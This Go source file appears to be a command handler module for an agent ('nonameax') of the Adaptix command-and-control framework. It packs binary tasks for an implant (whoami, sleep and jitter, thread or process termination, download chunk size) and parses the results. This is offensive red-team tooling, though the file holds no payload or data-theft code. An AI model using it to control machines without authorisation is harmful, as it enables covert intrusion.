package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strconv"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

func formatSleepMs(ms uint32) string {
	if ms == 0 {
		return "0s"
	}
	if ms < 1000 {
		return fmt.Sprintf("%dms", ms)
	}
	if ms%1000 == 0 {
		return fmt.Sprintf("%ds", ms/1000)
	}
	return fmt.Sprintf("%.1fs", float64(ms)/1000.0)
}

func cmdWhoami(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	task := adaptix.TaskData{
		Type: taskTypeTask,
		Data: []byte{CMD_WHOAMI, 0x00, 0x00, 0x00, 0x00},
		Sync: true,
	}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "whoami task queued"}
	return task, msg, nil
}

func cmdSleep(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	sleepStr, err := adaptix.GetStringArg(args, "sleep")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: sleep: 'sleep' argument required")
	}
	var sleepMs int64
	if n, err := strconv.ParseInt(sleepStr, 10, 64); err == nil {
		sleepMs = n * 1000
	} else if d, err := time.ParseDuration(sleepStr); err == nil {
		sleepMs = d.Milliseconds()
	} else {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: sleep: must be seconds (e.g. 10) or duration (e.g. 500ms, 1.5s, 1m30s)")
	}
	if sleepMs < 0 {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: sleep: value must be ≥ 0")
	}
	jitterPct := int(adaptix.GetFloatArgDefault(args, "jitter", 0))
	if jitterPct < 0 || jitterPct > 100 {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: sleep: jitter must be 0–100")
	}
	// cmd_id(1) | args_len(4LE)=5 | sleep_ms(4LE) | jitter(1)
	data := make([]byte, 10)
	data[0] = CMD_SLEEP
	binary.LittleEndian.PutUint32(data[1:5], 5)
	binary.LittleEndian.PutUint32(data[5:9], uint32(sleepMs))
	data[9] = byte(jitterPct)
	var msgText string
	if jitterPct > 0 {
		msgText = fmt.Sprintf("sleep set to %s (jitter %d%%)", formatSleepMs(uint32(sleepMs)), jitterPct)
	} else {
		msgText = fmt.Sprintf("sleep set to %s", formatSleepMs(uint32(sleepMs)))
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: msgText}
	return task, msg, nil
}

func cmdTerminate(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	switch subcommand {
	case "thread":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_EXIT_THREAD, 0x00, 0x00, 0x00, 0x00},
			Sync: false,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "terminate thread task queued"}
		return task, msg, nil
	case "process":
		task := adaptix.TaskData{
			Type: taskTypeTask,
			Data: []byte{CMD_EXIT_PROC, 0x00, 0x00, 0x00, 0x00},
			Sync: false,
		}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "terminate process task queued"}
		return task, msg, nil
	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: terminate: subcommand must be 'thread' or 'process'")
	}
}

func cmdChunksize(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	sizeStr, err := adaptix.GetStringArg(args, "size")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: chunksize: 'size' argument required (e.g. 2MB, 512KB, 1048576)")
	}
	parsed, csErr := parseChunkSize(sizeStr)
	if csErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: chunksize: %w", csErr)
	}
	data := make([]byte, 9)
	data[0] = CMD_CHUNKSIZE
	binary.LittleEndian.PutUint32(data[1:5], 4)
	binary.LittleEndian.PutUint32(data[5:9], uint32(parsed))
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("Setting download chunk size to %s", humanSize(parsed))}
	return task, msg, nil
}

func resultSleep(agentData adaptix.AgentData, data []byte) (string, string) {
	if len(data) < 5 {
		return string(data), ""
	}
	sleepMs := binary.LittleEndian.Uint32(data[0:4])
	jitterPct := uint(data[4])
	displayText := string(data[5:])
	if Ts != nil {
		updated := agentData
		updated.Sleep = uint(sleepMs / 1000)
		updated.Jitter = jitterPct
		_ = Ts.TsAgentUpdateData(updated)
	}
	return displayText, ""
}

func resultChunksize(data []byte) (string, string) {
	if len(data) < 4 {
		return string(data), ""
	}
	newSz := binary.LittleEndian.Uint32(data[0:4])
	return fmt.Sprintf("Download chunk size set to %s", humanSize(int(newSz))), ""
}
